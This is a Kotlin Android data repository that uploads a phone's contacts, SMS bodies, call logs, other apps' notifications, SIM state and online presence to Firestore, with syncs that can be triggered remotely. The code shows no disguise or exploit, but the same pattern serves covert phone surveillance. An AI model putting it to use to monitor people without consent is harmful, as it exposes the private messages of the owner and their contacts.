package com.boxx.datasync.data.repository

import android.util.Log
import com.boxx.datasync.domain.model.*
import com.boxx.datasync.domain.repository.DataRepository
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.google.firebase.firestore.snapshots
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.catch
import kotlinx.coroutines.flow.map
import kotlinx.coroutines.tasks.await
import java.security.MessageDigest
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class DataRepositoryImpl @Inject constructor() : DataRepository {
    private val db = FirebaseFirestore.getInstance()
    private val crashlytics = FirebaseCrashlytics.getInstance()

    override suspend fun updateDeviceInfo(device: Device) {
        try {
            db.collection("devices")
                .document(device.deviceId)
                .set(device, SetOptions.merge())
                .await()
        } catch (e: Exception) {
            Log.e("DataRepositoryImpl", "Error updating device info", e)
            crashlytics.recordException(e)
        }
    }

    override suspend fun updateDeviceInfoMap(deviceId: String, updates: Map<String, Any?>) {
        if (deviceId.isBlank()) return
        try {
            db.collection("devices")
                .document(deviceId)
                .set(updates, SetOptions.merge())
                .await()
            Log.d("DataRepositoryImpl", "DEVICE_DOC_UPDATED: $deviceId")
        } catch (e: Exception) {
            Log.e("DataRepositoryImpl", "Error updating device info map", e)
            crashlytics.recordException(e)
            throw e
        }
    }

    override suspend fun testDeviceWrite(deviceId: String) {
        if (deviceId.isBlank()) error("Missing deviceId")
        db.collection("devices")
            .document(deviceId)
            .set(mapOf("firebaseWriteVerifiedAt" to System.currentTimeMillis()), SetOptions.merge())
            .await()
    }

    override suspend fun syncContacts(deviceId: String, contacts: List<Contact>) {
        syncCollection(deviceId, "contacts", contacts) { it.id.ifBlank { hashString(it.phone) } }
    }

    override suspend fun syncSMS(deviceId: String, smsList: List<SMS>) {
        syncCollection(deviceId, "sms", smsList) { it.id.ifBlank { hashString("${it.address}${it.date}${it.body}") } }
    }

    override suspend fun syncCallLogs(deviceId: String, callLogs: List<CallLog>) {
        syncCollection(deviceId, "calllogs", callLogs) { it.id.ifBlank { hashString("${it.number}${it.date}${it.type}") } }
    }

    override suspend fun syncNotification(deviceId: String, notification: NotificationData) {
        if (deviceId.isBlank()) return
        try {
            val docId = notification.id.ifBlank { hashString("${notification.packageName}${notification.timestamp}${notification.title}") }
            db.collection("devices")
                .document(deviceId)
                .collection("notifications")
                .document(docId)
                .set(notification)
                .await()
        } catch (e: Exception) {
            Log.e("DataRepositoryImpl", "Error syncing notification", e)
            crashlytics.recordException(e)
            throw e
        }
    }

    override suspend fun deleteSyncedData(deviceId: String) {
        if (deviceId.isBlank()) return
        try {
            val collections = listOf("contacts", "sms", "calllogs", "notifications")
            for (collection in collections) {
                val snapshot = db.collection("devices")
                    .document(deviceId)
                    .collection(collection)
                    .get()
                    .await()

                val chunks = snapshot.documents.chunked(500)
                for (chunk in chunks) {
                    val batch = db.batch()
                    for (doc in chunk) {
                        batch.delete(doc.reference)
                    }
                    batch.commit().await()
                }
            }
            updateDeviceInfoMap(
                deviceId,
                mapOf(
                    "contactCount" to 0,
                    "smsCount" to 0,
                    "callCount" to 0,
                    "notificationCount" to 0
                )
            )
        } catch (e: Exception) {
            Log.e("DataRepositoryImpl", "Error deleting data", e)
            crashlytics.recordException(e)
        }
    }

    private suspend fun <T : Any> syncCollection(
        deviceId: String,
        collectionName: String,
        data: List<T>,
        idSelector: (T) -> String
    ) {
        if (deviceId.isBlank()) return
        val collectionRef = db.collection("devices")
            .document(deviceId)
            .collection(collectionName)

        try {
            Log.d("DataRepositoryImpl", "FIRESTORE_BATCH_START: collection=$collectionName items=${data.size}")
            val chunks = data.chunked(500)
            for (chunk in chunks) {
                val batch = db.batch()
                chunk.forEach { item ->
                    val docId = idSelector(item)
                    val docRef = collectionRef.document(docId)
                    batch.set(docRef, item)
                }
                batch.commit().await()
            }
            Log.d("DataRepositoryImpl", "FIRESTORE_BATCH_SUCCESS: collection=$collectionName")
        } catch (e: Exception) {
            Log.e("DataRepositoryImpl", "FIRESTORE_BATCH_ERROR: collection=$collectionName error=${e.localizedMessage}", e)
            crashlytics.recordException(e)
            throw e
        }
    }

    private fun hashString(input: String): String {
        return MessageDigest.getInstance("SHA-256")
            .digest(input.toByteArray())
            .joinToString("") { "%02x".format(it) }
    }

    override suspend fun syncIncremental(
        deviceId: String,
        contacts: List<Contact>,
        smsList: List<SMS>,
        callLogs: List<CallLog>
    ) {
        if (deviceId.isBlank()) return

        if (contacts.isNotEmpty()) syncContacts(deviceId, contacts)
        if (smsList.isNotEmpty()) syncSMS(deviceId, smsList)
        if (callLogs.isNotEmpty()) syncCallLogs(deviceId, callLogs)
    }

    override suspend fun performSync(
        deviceId: String,
        contacts: List<Contact>,
        smsList: List<SMS>,
        callLogs: List<CallLog>,
        simState: Map<String, Any>,
        isFullSync: Boolean,
        lastHandledSyncRequest: Long
    ) {
        if (deviceId.isBlank()) return
        val currentTime = System.currentTimeMillis()

        try {
            syncIncremental(deviceId, contacts, smsList, callLogs)

            val updateMap = mutableMapOf<String, Any>(
                "deviceId" to deviceId,
                "deviceName" to "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}",
                "manufacturer" to android.os.Build.MANUFACTURER,
                "model" to android.os.Build.MODEL,
                "osVersion" to android.os.Build.VERSION.RELEASE,
                "lastSyncTime" to currentTime,
                "heartbeatAt" to currentTime,
                "timestamp" to currentTime,
                "syncStatus" to "Synced",
                "presenceStatus" to "Online",
                "lastError" to "",
                "syncRequestedAt" to lastHandledSyncRequest
            )
            updateMap.putAll(simState)

            updateDeviceInfoMap(deviceId, updateMap)
            Log.d("Sync", "CLIENT_SYNC_SUCCESS")
        } catch (e: Exception) {
            Log.e("Sync", "CLIENT_SYNC_FAILED", e)
            val errorMsg = e.localizedMessage ?: "Unknown error"
            updateDeviceInfoMap(deviceId, mapOf(
                "lastSyncTime" to currentTime,
                "heartbeatAt" to currentTime,
                "syncStatus" to "Error: $errorMsg",
                "lastError" to errorMsg,
                "presenceStatus" to "Online"
            ))
            throw e
        }
    }

    override fun observeSyncRequests(deviceId: String): Flow<Long> {
        if (deviceId.isBlank()) return kotlinx.coroutines.flow.flowOf(0L)
        return db.collection("devices")
            .document(deviceId)
            .snapshots()
            .map { snapshot ->
                snapshot.getLong("syncRequestedAt") ?: 0L
            }
            .catch { e ->
                Log.e("DataRepositoryImpl", "Error observing sync requests", e)
                emit(0L)
            }
    }

    override suspend fun incrementNotificationCount(deviceId: String) {
        if (deviceId.isBlank()) return
        try {
            db.collection("devices")
                .document(deviceId)
                .set(mapOf("notificationCount" to FieldValue.increment(1), "heartbeatAt" to System.currentTimeMillis()), SetOptions.merge())
                .await()
        } catch (e: Exception) {
            Log.e("DataRepositoryImpl", "Error incrementing notification count", e)
        }
    }

    override suspend fun updateHeartbeat(deviceId: String) {
        if (deviceId.isBlank()) return
        try {
            db.collection("devices")
                .document(deviceId)
                .set(
                    mapOf(
                        "heartbeatAt" to System.currentTimeMillis()
                    ),
                    SetOptions.merge()
                )
                .await()
        } catch (e: Exception) {
            Log.e("DataRepositoryImpl", "Error updating heartbeat", e)
        }
    }
}
